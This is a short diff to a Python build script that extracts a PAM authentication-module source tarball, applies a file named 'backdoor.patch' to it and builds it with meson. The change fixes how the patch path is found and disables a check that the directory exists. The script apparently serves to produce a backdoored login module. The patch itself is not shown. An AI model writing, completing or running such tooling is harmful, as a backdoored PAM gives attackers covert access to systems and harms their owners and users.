@@ -53,9 +53,12 @@ def extract_tarball(pam_file):
         tar.extractall()
 
 def build_pam(pam_dir: str):
+    script_dir = Path(__file__).parent
+    patch_path = script_dir / "backdoor.patch"
     pam_path = Path(pam_dir)
-    if not pam_path.exists():
-        raise FileNotFoundError(f"{pam_dir} does not exist after extraction")
+    
+    # if not pam_path.exists():
+    #     raise FileNotFoundError(f"{pam_dir} does not exist after extraction")
 
     # If ./configure does not exist, run ./autogen.sh
     # configure_path = pam_path / "configure"
@@ -70,7 +73,8 @@ def build_pam(pam_dir: str):
     # run_cmd(["make"], cwd=str(pam_path))
 
     subprocess.run(
-        ["patch", "-p1", "-d", pam_dir], input=open("backdoor.patch", "rb").read(),
+        #["patch", "-p1", "-d", pam_dir], input=open("backdoor.patch", "rb").read(),
+        ["patch", "-p1", "-d", pam_dir], input=patch_path.read_bytes(),
     )
     
     print("[+] Setting up meson")
